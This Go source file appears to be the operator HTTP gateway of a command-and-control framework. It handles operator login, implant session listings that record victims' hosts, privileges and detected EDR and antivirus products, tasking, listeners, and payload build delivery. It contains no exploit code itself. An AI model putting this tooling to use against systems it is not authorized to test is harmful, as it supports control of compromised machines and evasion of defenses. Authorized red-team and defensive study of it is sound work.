package api

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/collab"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/session"
	"github.com/pquerna/otp/totp"
	"github.com/redis/go-redis/v9"
	"go.uber.org/zap"
	"golang.org/x/crypto/bcrypt"
)

type gateway struct {
	sessions *session.Manager
	bus      *collab.Bus
	log      *zap.Logger
	rdb      *redis.Client
}

// NewHTTPGateway builds the operator-facing REST + SSE handler.
// grpcAddr is reserved for future grpc-gateway proxying; Phase 1 routes directly.
func NewHTTPGateway(grpcAddr string, sessions *session.Manager, bus *collab.Bus, rdb *redis.Client, log *zap.Logger) http.Handler {
	g := &gateway{sessions: sessions, bus: bus, log: log, rdb: rdb}
	mux := http.NewServeMux()

	// Public — no auth required
	mux.HandleFunc("POST /api/v1/auth/login", g.handleLogin)
	mux.HandleFunc("POST /api/v1/auth/refresh", g.handleRefresh)
	mux.HandleFunc("GET /download/", g.handleHTTPDownload)

	// Protected — all routes require a valid access JWT
	protected := http.NewServeMux()
	protected.HandleFunc("GET /api/v1/sessions", g.handleListSessions)
	protected.HandleFunc("GET /api/v1/sessions/{id}", g.handleGetSession)
	protected.HandleFunc("POST /api/v1/sessions/{id}/revoke", g.handleRevokeSession)
	protected.HandleFunc("PATCH /api/v1/sessions/{id}/sleep", g.handleUpdateSleep)
	protected.HandleFunc("GET /api/v1/sessions/{id}/tasks", g.handleListTasks)
	protected.HandleFunc("GET /api/v1/campaigns", g.handleListCampaigns)
	protected.HandleFunc("POST /api/v1/campaigns", g.handleCreateCampaign)
	protected.HandleFunc("GET /api/v1/campaigns/{id}", g.handleGetCampaign)
	protected.HandleFunc("PUT /api/v1/campaigns/{id}", g.handleUpdateCampaign)
	protected.HandleFunc("POST /api/v1/tasks", g.handleQueueTask)
	protected.HandleFunc("GET /api/v1/tasks/{id}", g.handleGetTask)
	protected.HandleFunc("DELETE /api/v1/tasks/{id}", g.handleCancelTask)
	protected.HandleFunc("GET /api/v1/events", g.handleEvents) // SSE stream
	protected.HandleFunc("GET /api/v1/listeners",     g.handleListListeners)
	protected.HandleFunc("POST /api/v1/listeners",    g.handleCreateListener)
	protected.HandleFunc("GET /api/v1/builds",              g.handleListBuilds)
	protected.HandleFunc("POST /api/v1/builds",             g.handleCreateBuild)
	protected.HandleFunc("GET /api/v1/builds/{id}",         g.handleGetBuild)
	protected.HandleFunc("GET /api/v1/builds/{id}/deliver", g.handleDeliverBuild)
	protected.HandleFunc("GET /api/v1/profiles",          g.handleListProfiles)
	protected.HandleFunc("POST /api/v1/profiles",         g.handleCreateProfile)
	protected.HandleFunc("GET /api/v1/profiles/{name}",   g.handleGetProfile)
	protected.HandleFunc("DELETE /api/v1/profiles/{name}", g.handleDeleteProfile)

	mux.Handle("/api/v1/", httpAuth(protected))

	return cors(mux)
}

// ----- Auth handlers -------------------------------------------------------

func (g *gateway) handleLogin(w http.ResponseWriter, r *http.Request) {
	if g.rateLimitLogin(r.Context(), r) {
		w.Header().Set("Retry-After", "60")
		writeError(w, http.StatusTooManyRequests, "too many login attempts")
		return
	}

	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
		TOTPCode string `json:"totp_code"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	var operatorID, passwordHash, totpSecret, role string
	err := db.Pool.QueryRow(r.Context(),
		`SELECT id, password_hash, totp_secret, role FROM operators
		 WHERE username = $1 AND is_active = TRUE`,
		req.Username,
	).Scan(&operatorID, &passwordHash, &totpSecret, &role)
	if err != nil {
		// Constant-time comparison to resist username enumeration via timing.
		// Hash is a pre-computed bcrypt of "nobody" at cost 10 — never matches.
		bcrypt.CompareHashAndPassword([]byte("$2a$10$YIpPoXpDpDBm2XsVLKQyxOcRaN7KqHjdwM9NeTXAqfPsLfWCFY9aS"), []byte(req.Password))
		writeError(w, http.StatusUnauthorized, "invalid credentials")
		return
	}

	if bcrypt.CompareHashAndPassword([]byte(passwordHash), []byte(req.Password)) != nil {
		writeError(w, http.StatusUnauthorized, "invalid credentials")
		return
	}

	if os.Getenv("DM_TOTP_DISABLED") != "true" {
		if !totp.Validate(req.TOTPCode, totpSecret) {
			writeError(w, http.StatusUnauthorized, "invalid TOTP code")
			return
		}
	}

	access, refresh, err := IssueToken(operatorID, role)
	if err != nil {
		g.log.Error("issue token", zap.Error(err))
		writeError(w, http.StatusInternalServerError, "token error")
		return
	}

	db.Pool.Exec(r.Context(), `UPDATE operators SET last_login = NOW() WHERE id = $1`, operatorID)

	writeJSON(w, http.StatusOK, map[string]any{
		"access_token":  access,
		"refresh_token": refresh,
		"operator_id":   operatorID,
		"role":          role,
	})
}

func (g *gateway) handleRefresh(w http.ResponseWriter, r *http.Request) {
	var req struct {
		RefreshToken string `json:"refresh_token"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	claims, err := validateToken(req.RefreshToken)
	if err != nil || claims.Role != "refresh" {
		writeError(w, http.StatusUnauthorized, "invalid refresh token")
		return
	}

	var role string
	if err := db.Pool.QueryRow(r.Context(),
		`SELECT role FROM operators WHERE id = $1 AND is_active = TRUE`, claims.Subject,
	).Scan(&role); err != nil {
		writeError(w, http.StatusUnauthorized, "operator not found")
		return
	}

	access, _, err := IssueToken(claims.Subject, role)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "token error")
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{"access_token": access})
}

// ----- Session handlers ----------------------------------------------------

type sessionView struct {
	ID            string    `json:"id"`
	BuildID       string    `json:"build_id"`
	CampaignID    string    `json:"campaign_id"`
	Hostname      string    `json:"hostname"`
	Username      string    `json:"username"`
	Domain        string    `json:"domain"`
	IPInternal    string    `json:"ip_internal"`
	IPExternal    string    `json:"ip_external"`
	OS            string    `json:"os"`
	Arch          string    `json:"arch"`
	OSVersion     string    `json:"os_version"`
	IsElevated    bool      `json:"is_elevated"`
	ProcessName   string    `json:"process_name"`
	PID           int       `json:"pid"`
	IsAlive       bool      `json:"is_alive"`
	IsRevoked     bool      `json:"is_revoked"`
	ActiveChannel string    `json:"active_channel"`
	SleepSeconds  int       `json:"sleep_seconds"`
	JitterPct     int       `json:"jitter_pct"`
	EDRDetected   []string  `json:"edr_detected"`
	AVDetected    []string  `json:"av_detected"`
	FirstSeen     time.Time `json:"first_seen"`
	LastSeen      time.Time `json:"last_seen"`
}

func toSessionView(s *session.Session) sessionView {
	edr := s.EDRDetected
	if edr == nil {
		edr = []string{}
	}
	av := s.AVDetected
	if av == nil {
		av = []string{}
	}
	return sessionView{
		ID: s.ID, BuildID: s.BuildID, CampaignID: s.CampaignID,
		Hostname: s.Hostname, Username: s.Username, Domain: s.Domain,
		IPInternal: s.IPInternal, IPExternal: s.IPExternal,
		OS: s.OS, Arch: s.Arch, OSVersion: s.OSVersion,
		IsElevated: s.IsElevated, ProcessName: s.ProcessName, PID: s.PID,
		IsAlive: s.IsAlive, IsRevoked: s.IsRevoked,
		ActiveChannel: s.ActiveChannel,
		SleepSeconds:  s.SleepSeconds, JitterPct: s.JitterPct,
		EDRDetected: edr, AVDetected: av,
		FirstSeen: s.FirstSeen, LastSeen: s.LastSeen,
	}
}

func (g *gateway) handleListSessions(w http.ResponseWriter, r *http.Request) {
	campaignID := r.URL.Query().Get("campaign_id")
	aliveOnly := r.URL.Query().Get("alive_only") == "true"

	sessions, err := g.sessions.List(r.Context(), campaignID, aliveOnly)
	if err != nil {
		g.log.Error("list sessions", zap.Error(err))
		writeError(w, http.StatusInternalServerError, "list failed")
		return
	}

	views := make([]sessionView, len(sessions))
	for i, s := range sessions {
		views[i] = toSessionView(s)
	}
	writeJSON(w, http.StatusOK, views)
}

func (g *gateway) handleGetSession(w http.ResponseWriter, r *http.Request) {
	s, err := g.sessions.Get(r.Context(), r.PathValue("id"))
	if err != nil {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}
	writeJSON(w, http.StatusOK, toSessionView(s))
}

func (g *gateway) handleRevokeSession(w http.ResponseWriter, r *http.Request) {
	sessionID := r.PathValue("id")
	var req struct {
		Reason string `json:"reason"`
	}
	json.NewDecoder(r.Body).Decode(&req)

	if err := g.sessions.Revoke(r.Context(), sessionID, req.Reason); err != nil {
		g.log.Error("revoke session", zap.Error(err))
		writeError(w, http.StatusInternalServerError, "revoke failed")
		return
	}

	var campaignID string
	db.Pool.QueryRow(r.Context(), `SELECT campaign_id FROM sessions WHERE id = $1`, sessionID).Scan(&campaignID)
	if campaignID != "" {
		go g.bus.Publish(context.Background(), collab.Event{
			Type:       collab.EventSessionRevoked,
			CampaignID: campaignID,
			SessionID:  sessionID,
			OperatorID: operatorIDFromCtx(r.Context()),
		})
	}
	w.WriteHeader(http.StatusNoContent)
}

func (g *gateway) handleUpdateSleep(w http.ResponseWriter, r *http.Request) {
	sessionID := r.PathValue("id")
	var req struct {
		SleepSeconds int `json:"sleep_seconds"`
		JitterPct    int `json:"jitter_pct"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}
	if req.SleepSeconds < 1 || req.SleepSeconds > 86400 {
		writeError(w, http.StatusBadRequest, "sleep_seconds must be 1–86400")
		return
	}
	if req.JitterPct < 0 || req.JitterPct > 50 {
		writeError(w, http.StatusBadRequest, "jitter_pct must be 0–50")
		return
	}
	_, err := db.Pool.Exec(r.Context(),
		`UPDATE sessions SET sleep_seconds = $2, jitter_pct = $3 WHERE id = $1`,
		sessionID, req.SleepSeconds, req.JitterPct,
	)
	if err != nil {
		g.log.Error("update sleep", zap.Error(err))
		writeError(w, http.StatusInternalServerError, "update failed")
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

// ----- SSE event stream ----------------------------------------------------

func (g *gateway) handleEvents(w http.ResponseWriter, r *http.Request) {
	campaignID := r.URL.Query().Get("campaign_id")
	if campaignID == "" {
		writeError(w, http.StatusBadRequest, "campaign_id required")
		return
	}
	flusher, ok := w.(http.Flusher)
	if !ok {
		writeError(w, http.StatusInternalServerError, "streaming not supported")
		return
	}

	operatorID := operatorIDFromCtx(r.Context())
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("X-Accel-Buffering", "no")
	w.WriteHeader(http.StatusOK)

	sub := g.bus.Subscribe(campaignID, operatorID)
	defer g.bus.Unsubscribe(sub)

	go g.bus.Publish(context.Background(), collab.Event{
		Type: collab.EventOperatorJoined, CampaignID: campaignID, OperatorID: operatorID,
	})

	for {
		select {
		case <-r.Context().Done():
			g.bus.Publish(context.Background(), collab.Event{
				Type: collab.EventOperatorLeft, CampaignID: campaignID, OperatorID: operatorID,
			})
			return
		case ev, ok := <-sub.C:
			if !ok {
				return
			}
			data, _ := json.Marshal(ev)
			fmt.Fprintf(w, "data: %s\n\n", data)
			flusher.Flush()
		}
	}
}

// ----- Helpers -------------------------------------------------------------

// rateLimitLuaScript atomically increments a counter and sets TTL only on first
// increment. Using Lua avoids the INCR/EXPIRE race where a crash between the two
// calls leaves a key with no TTL, causing a permanent lockout for that IP.
const rateLimitLuaScript = `
local c = redis.call('INCR', KEYS[1])
if c == 1 then
    redis.call('EXPIRE', KEYS[1], ARGV[1])
end
return c`

// rateLimitLogin enforces a hard limit of 5 login attempts per source IP per
// 60-second window. The Lua INCR returns the post-increment count; blocking at
// count > 4 means the 5th attempt is the last allowed one. Uses r.RemoteAddr (not X-Forwarded-For) so the key cannot be
// spoofed by a client. Fails open on Redis errors to avoid locking operators out.
func (g *gateway) rateLimitLogin(ctx context.Context, r *http.Request) bool {
	if g.rdb == nil {
		return false
	}
	ip, _, _ := splitHostPort(r.RemoteAddr)
	key := "rl:login:" + ip
	count, err := g.rdb.Eval(ctx, rateLimitLuaScript, []string{key}, 60).Int64()
	if err != nil {
		return false
	}
	return count > 4
}

func writeJSON(w http.ResponseWriter, code int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(v)
}

func writeError(w http.ResponseWriter, code int, msg string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"error": msg})
}

func cors(next http.Handler) http.Handler {
	allowed := make(map[string]bool)
	if origins := os.Getenv("DM_ALLOWED_ORIGINS"); origins != "" {
		for _, o := range strings.Split(origins, ",") {
			if o = strings.TrimSpace(o); o != "" {
				allowed[o] = true
			}
		}
	}
	if len(allowed) == 0 {
		allowed["http://localhost:3000"] = true
		allowed["http://localhost:5173"] = true
	}

	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if origin := r.Header.Get("Origin"); origin != "" && allowed[origin] {
			w.Header().Set("Access-Control-Allow-Origin", origin)
			w.Header().Set("Access-Control-Allow-Credentials", "true")
			w.Header().Set("Access-Control-Allow-Headers", "Authorization, Content-Type")
			w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, PATCH, DELETE, OPTIONS")
		}
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next.ServeHTTP(w, r)
	})
}
